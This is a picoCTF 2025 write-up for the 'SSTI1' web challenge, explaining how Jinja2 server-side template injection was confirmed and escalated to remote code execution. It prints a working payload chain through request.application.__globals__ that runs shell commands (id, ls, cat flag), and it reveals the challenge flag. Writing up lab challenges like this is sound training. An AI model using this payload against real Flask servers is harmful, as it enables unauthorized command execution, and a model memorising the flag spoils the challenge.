# SSTI1 - picoCTF 2025

## ğŸ“‚ Category
- Web Exploitation  
- Difficulty: Easy  

---

## ğŸ§© Challenge Description
The challenge provided a simple web form that reflected user input. 

---

## ğŸ” Initial Observations
- Entering expressions like `{{7*7}}` returned `49`, indicating possible Server-Side Template Injection (SSTI).
---

## ğŸ§ª Exploitation Steps

1. Entered: {{7*7}} â†’ Response was `49` â†’ Confirmed SSTI.
2. Tried: {{request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('id').read()}}
3. Got a system-level response confirming Remote Code Execution (RCE).
4. Ran: {{request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('ls').read()}}
5. Server files listed.
6. Finally: {{request.application.\_\_globals\_\_.\_\_builtins\_\_.\_\_import\_\_('os').popen('cat flag').read()}}
7. Revealed the flag.

---

## ğŸ Flag

picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_424a1494}

---

## ğŸ§  What I Learned

**What is a Template Engine?**
A template engine helps generate dynamic web pages. Instead of hardcoding values, you write placeholders like:

```<p>Hello, {{ name }}!</p>```

The server fills in the actual data.

Here, this webpage uses Jinja2 of the python's flask framework on the server-side for making the webpage dynamic. Different frameworks run differently. For example, if the webpage was running Django instead, we can run {{7}}.

**What is SSTI?**
Server-Side Template Injection occurs when user input is unsafely inserted into a template. If an input like {{7\*7}} returns 49 (7 times 7 = 49), the server is evaluating user input as code. Running 7\*7 is just the standard convention, but you can run any expression, mathematical or not.

If unpatched, SSTI can lead to:
- Data leaks
- Remote code execution (RCE)
- Full server compromise

**Code explanation**

```{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}```

- ```request```	: A Flask object representing the current HTTP request.
- ```request.application``` : The Flask application instance being used.
- ```__globals__```: Accesses the global variables of the templateâ€™s underlying Python environment.
- ```__builtins__``` : Exposes all built-in Python functions and objects (like open, print, __import__, etc.).
- ```__import__('os')``` : Dynamically imports the os module â€” a powerful module for interacting with the system.
- ```.popen('id')``` : Runs the shell command id, which returns the current user and group info. Can replace with other commands (eg: ls, cat, etc)
- ```.read()``` : Reads and returns the output of that command.


---

## ğŸ“š References

https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/
